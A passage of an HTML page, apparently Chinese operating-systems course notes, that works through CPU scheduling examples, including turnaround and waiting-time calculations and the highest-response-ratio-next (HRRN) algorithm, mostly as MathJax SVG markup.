211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(6681,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(7070,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(7570,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>7时刻(P2完成)：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="11.669ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 5157.8 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(1467.6,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(1967.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2356.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(2801.2,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mo" transform="translate(3879.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(4268.8,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(4768.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>11时刻(P4完成)：<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="5.332ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2356.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(1467.6,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(1967.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p>16时刻(P1完成)</p><p>周转时间 = 作业完成时间 - 作业提交(到达)时间：</p><script type="math/tex; mode=display">P1=16-0=16\\P2=7-2=5\\P3=5-4=1\\P4=11-5=6</script><p>带权周转时间 = 周转时间 / 作业实际运行的时间：</p><script type="math/tex; mode=display">P1=\frac{16}{7}=2.28\\P2=\frac{5}{4}=1.25\\P3=\frac{1}{1}=1\\P4=\frac{6}{4}=1.5</script><p>等待时间 = 周转时间 - 运行时间 - I/O操作的时间(这里为0)：</p><script type="math/tex; mode=display">P1=16-7=9\\P2=5-4=1\\P3=1-1=0\\P4=6-4=2</script><h4 id="2-8-7-3-HRRN-高相应比优先"><a href="#2-8-7-3-HRRN-高相应比优先" class="headerlink" title="2.8.7.3 HRRN(高相应比优先)"></a>2.8.7.3 HRRN(高相应比优先)</h4><p>算法思想：综合考虑作业/进程的等待时间和要求服务的时间</p><p>算法规则：在每次调度时先计算各个作业/进程的响应比，选择响应比最高的作业/进程为其服务</p><script type="math/tex; mode=display">响应比 = \frac{等待时间+要求服务时间}{要求服务时间}</script><p>用于作业 / 进程调度：可用于作业调度，也可用于进程调度</p><p>是否可抢占：非抢占式的算法，因此只有当前运行的作业/进程主动放弃处理机时，才需要调度，才需要计算响应比</p><p>优点：综合考虑了等待时间和运行时间(要求服务时间)；等待时间相同时，要求服务时间短的优先(SJF的优点)；要求服务时间相同时，等待时间长的优先(FCFS的优点)；对于长作业来说，随着等待时间越来越久，其响应比也会越来越大，从而避免了长作业饥饿的问题</p><p>是否会导致饥饿：不会</p><p>例：例题同上，使用高响应比优先算法。</p><p>0时刻：只有<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="2.44ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1078.6 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></svg></mjx-container>到达就绪队列，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="2.44ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1078.6 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></svg></mjx-container>上处理机</p><p>7时刻(P1主动放弃CPU)：就绪队列中有<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.781ex" xmlns="http://www.w3.org/2000/svg" width="27.495ex" height="3.15ex" role="img" focusable="false" viewBox="0 -1047.1 12152.7 1392.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1467.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">响</text></g><g data-mml-node="mi" transform="translate(2367.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">应</text></g><g data-mml-node="mi" transform="translate(3267.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">比</text></g><g data-mml-node="mo" transform="translate(4445.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(5501.1,0)"><g data-mml-node="mrow" transform="translate(220,516.8) scale(0.707)"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1667,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(2167,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2556,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(3334,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g><g data-mml-node="mn" transform="translate(1398.7,-345) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><rect width="2911" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(8929.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(9985.7,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(778,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1278,0)"></path></g><g data-mml-node="mo" transform="translate(11763.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>、<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.781ex" xmlns="http://www.w3.org/2000/svg" width="24.603ex" height="3.15ex" role="img" focusable="false" viewBox="0 -1047.1 10874.7 1392.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1467.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">响</text></g><g data-mml-node="mi" transform="translate(2367.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">应</text></g><g data-mml-node="mi" transform="translate(3267.6,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">比</text></g><g data-mml-node="mo" transform="translate(4445.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(5501.1,0)"><g data-mml-node="mrow" transform="translate(220,516.8) scale(0.707)"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1667,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(2167,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2556,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(3334,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mn" transform="translate(1398.7,-345) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><rect width="2911" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(8929.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(9985.7,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(10485.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 